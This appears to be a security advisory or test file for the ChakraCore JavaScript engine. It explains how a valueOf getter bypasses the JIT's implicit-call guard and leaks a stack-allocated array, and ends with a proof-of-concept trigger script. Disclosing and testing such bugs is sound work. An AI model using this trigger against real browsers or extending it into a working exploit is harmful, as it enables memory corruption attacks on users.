@@ -1,0 +1,91 @@
+/*
+Let's consider the following example code.
+function opt() {
+    let arr = [];
+    return arr['x'];
+}
+
+// Optimize the "opt" function.
+for (let i = 0; i < 100; i++) {
+    opt();
+}
+
+Array.prototype.__defineGetter__('x', function () {
+    
+});
+
+opt();
+
+
+Once the "opt" function has been optimized, the getter function for "x" can't be invoked from the JITed code, instead it bailouts and invokes the getter. This is due to the DisableImplicitCallFlag flag.
+
+Here's the function handling that logic.
+    template <class Fn>
+    inline Js::Var ExecuteImplicitCall(Js::RecyclableObject * function, Js::ImplicitCallFlags flags, Fn implicitCall)
+    {
+        // For now, we will not allow Function that is marked as HasNoSideEffect to be called, and we will just bailout.
+        // These function may still throw exceptions, so we will need to add checks with RecordImplicitException
+        // so that we don't throw exception when disableImplicitCall is set before we allow these function to be called
+        // as an optimization.  (These functions are valueOf and toString calls for built-in non primitive types)
+
+        Js::FunctionInfo::Attributes attributes = Js::FunctionInfo::GetAttributes(function);
+
+        // we can hoist out const method if we know the function doesn't have side effect,
+        // and the value can be hoisted.
+        if (this->HasNoSideEffect(function, attributes))
+        {
+            // Has no side effect means the function does not change global value or
+            // will check for implicit call flags
+            return implicitCall();
+        }
+
+        // Don't call the implicit call if disable implicit call
+        if (IsDisableImplicitCall())
+        {
+            AddImplicitCallFlags(flags);
+            // Return "undefined" just so we have a valid var, in case subsequent instructions are executed
+            // before we bail out.
+            return function->GetScriptContext()->GetLibrary()->GetUndefined();
+        }
+
+        if ((attributes & Js::FunctionInfo::HasNoSideEffect) != 0)
+        {
+            // Has no side effect means the function does not change global value or
+            // will check for implicit call flags
+            return implicitCall();
+        }
+
+        // Save and restore implicit flags around the implicit call
+
+        Js::ImplicitCallFlags saveImplicitCallFlags = this->GetImplicitCallFlags();
+        Js::Var result = implicitCall();
+        this->SetImplicitCallFlags((Js::ImplicitCallFlags)(saveImplicitCallFlags | flags));
+        return result;
+    }
+
+As you can see above, it checks if the DisableImplicitCallFlag flag is set using IsDisableImplicitCall, if it is, just returns undefined and bailouts.
+
+The reason that the flag was set in the example code was because of the "arr" variable was allocated in the stack. It was preventing the object from leaking through implicit calls.
+
+However, if the function has no side effect, the function gets called regardless of the flag. One such function that is marked as HasNoSideEffect, but we can abuse is the Object.prototype.valueOf method. This method returns "this" itself. So if we use this method as the getter, it will return the array object allocated in the stack.
+
+PoC:
+*/
+
+function opt() {
+    let arr = [];
+    return arr['x'];
+}
+
+function main() {
+    let arr = [1.1, 2.2, 3.3];
+    for (let i = 0; i < 0x10000; i++) {
+        opt();
+    }
+
+    Array.prototype.__defineGetter__('x', Object.prototype.valueOf);
+
+    print(opt());
+}
+
+main();
